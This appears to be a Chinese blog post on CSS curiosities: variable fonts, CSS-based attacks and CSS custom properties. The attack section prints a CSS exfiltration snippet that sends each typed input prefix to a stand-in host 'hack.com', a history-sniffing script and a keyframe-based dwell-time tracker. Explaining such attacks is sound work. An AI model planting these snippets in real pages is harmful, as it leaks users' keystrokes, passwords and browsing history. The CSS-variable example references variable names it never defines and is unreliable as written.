---
title: 🎨 有关 CSS 的一些极有趣的东西
description: 本文介绍了几种CSS中有趣的内容如变量字体、CSS攻击手段以及CSS新特性CSS变量。
---

## 灵活字体

> The future is variable, though the future is in the variable

灵活字体（Variable fonts）是一种包含字体元信息如字宽、字重（甚至自定义形变）的字体的字体方案。主要通过使用 CSS `font-variation-settings` 属性配置变形轴，来达到使字体形变的效果，如：

```css
h2 {
  font-size: 64px;
  font-variation-settings: 'wght' 375;
}

```

一张图展示其迷人之处：

![Variable fonts](https://mgear-image.oss-cn-shanghai.aliyuncs.com/image/css-interesting/2019-11-21-02-03-38.gif)

这里有一个展示其强大排版能力的示例页面：

<p class="codepen" data-height="265" data-theme-id="dark" data-default-tab="result" data-user="jpamental" data-slug-hash="wvwgGLK" style="height: 265px; box-sizing: border-box; display: flex; align-items: center; justify-content: center; border: 2px solid; margin: 1em 0; padding: 1em;" data-pen-title="Layout variations, part deux">
  <span>See the Pen <a rel="nofollow" href="https://codepen.io/jpamental/pen/wvwgGLK">
  Layout variations, part deux</a> by Jason Pamental (<a rel="nofollow" href="https://codepen.io/jpamental">@jpamental</a>)
  on <a rel="nofollow" href="https://codepen.io">CodePen</a>.</span>
</p>
<script async src="https://static.codepen.io/assets/embed/ei.js"></script>

啊，所以说要是不会设计还是做不出漂亮页面（狗子脸）

## CSS 攻击

也许大部分玩家都了解或熟悉 CSRF、XSS 之类的攻击方式及防御方式，不过你听说过这些使用 CSS 进行攻击的方法么？

### 输入检测

CSS Exfil 漏洞攻击意味着攻击者可以使用选择器确定你在页面输入的按键再通过 CSS 请求将其记录，如下代码：

```css
input[value^=a]{
    background-image: url(http://hack.com/a);
}
input[value^=b]{
    background-image: url(http://hack.com/b);
}
/* ... */
input[value^=z]{
    background-image: url(http://hack.com/9);
}
```

当你在输入框中输入字母的同时，浏览器将自动向攻击者指定的地址发送请求，你的字母输入顺序也就随之被记录下来了，结合 CSS 中其它特征，通过 CSS Exfil 攻击可以直接推断出一些输入简单的密码，凭借分析，也能推测出更加复杂的密码。

这里有一个测试网址可以用以重现与玩耍：[CSS Exfil 攻击测试](http://eaea.sirdarckcat.net/cssar/v2/)

### 历史记录检测

现在我们丢弃刚才提到的 CSS 选择器，转而使用 CSS 和浏览器打交道中所用到的其它东西，比如说：我们都知道在浏览器中点击过某个链接后，那个链接就会变色——对的，没错，问题就在这儿——通过向页面插入大量超链接，
可以通过标签的颜色就能判断你有没有浏览过这些链接，从而绕过浏览器限制。代码类似以下：

```js
const link = document.createElement('a')
link.href = 'www.baidu.com'
document.body.appendChild(link)
const color = document.defaultView.getComputedStyle(link, null).getPropertyValue('color')

const isView = color === 'rgb(0, 0, 255)'
```

想看源代码及或寻找更深入的讨论，请点这儿：[i-know-where-youve-been](https://blog.jeremiahgrossman.com/2006/08/i-know-where-youve-been.html)

### 用户轨迹追踪

了解过 CSS Exfil 后，我们大概都能想到通过纯 CSS 代码来追踪用户鼠标点击、甚至是用户鼠标轨迹的方案，但是关于用户在页面的停留时长，你有没有思路呢？

以下是一种可能的解决方案：

```css
@keyframes time-count {
  0% {
    background-image: url('track.php?duration=1s');
  }
  1% {
    background-image: url('track.php?duration=2s');
  }
  /* ... */
  100% {
    background-image: url('track.php?duration=100s');
  }
}
#duration:hover::after {
  animation-name: time-count;
  animation-duration: 100s;
}
```

### 其它攻击手段

这里有一个不全的清单：

* [Side-channel Attack](https://github.com/evonide/misc)
* [Text Reader](https://bugs.chromium.org/p/chromium/issues/detail?id=543078)
* [Scrollbar Attack](https://github.com/cgvwzq/css-scrollbar-attack)

欢迎各位在评论区补充（在此先谢过大佬们）

## CSS 变量

CSS 变量（官方叫做 Custom Properties，即自定义属性）是一个意义于作用同样强大的东西，它给 CSS 带来了原生层面意义上的代码模块化。我们可以通过浏览器 API 与 JavaScript 进行交互，使得其功效进一步扩大，
同时提高 CSS 的可读性及维护性。通过给 CSS 变量赋任意有意义的值，并交由 calc 函数计算，可以产生具有可读性的组合值。比如下面这个例子：

```css
.my-component {
  --theme-color: red;
  --card-width: 30px;
}
.my-component .title {
  color: var(--my-component-theme-color);
}
.my-component .card-container {
  width: calc(var(--my-component-card-width) * 3);
  border: solid 1px var(--my-component-theme-color);
}
```

我们给组件（my-component）定义了主题色及卡片宽度两个变量，这两个变量可以在作用范围内任意使用及被改造。这两个变量也意味着组件的样式向外部暴露了两个可供修改的入口。一般而言，我们可以使用这两种方法继续扩展代码，
以达到修改变量的目的：

```html
<link rel="stylesheet" href="my-component.css" />
<style>
  .my-component {
    --theme-color: gray;
  }
</style>
```

```js
const $con = document.querySelector('.my-component')
$con.style.setProperty('--theme-color', 'gray')
```

这里有一个能展示 CSS 变量超能力的极具吸引力的例子：

<p class="codepen" data-height="265" data-theme-id="dark" data-default-tab="css,result" data-user="danwilson" data-slug-hash="BRdJVZ" style="height: 265px; box-sizing: border-box; display: flex; align-items: center; justify-content: center; border: 2px solid; margin: 1em 0; padding: 1em;" data-pen-title="Single Div Accordion (Animated with CSS Variables)">
  <span>See the Pen <a rel="nofollow" href="https://codepen.io/danwilson/pen/BRdJVZ">
  Single Div Accordion (Animated with CSS Variables)</a> by Dan Wilson (<a rel="nofollow" href="https://codepen.io/danwilson">@danwilson</a>)
  on <a rel="nofollow" href="https://codepen.io">CodePen</a>.</span>
</p>
<script async src="https://static.codepen.io/assets/embed/ei.js"></script>

不知道你酸了没有，反正我是酸了。

## 阅读更多

希望本文能对你有所帮助，如果文中出现了不流畅或理解错误的地方也麻烦各位评论指出。<JJ><p>若有任何疑问，或想深入探讨，可以给我发邮件：dGFuZ25hZEBxcS5jb20=</p></JJ>

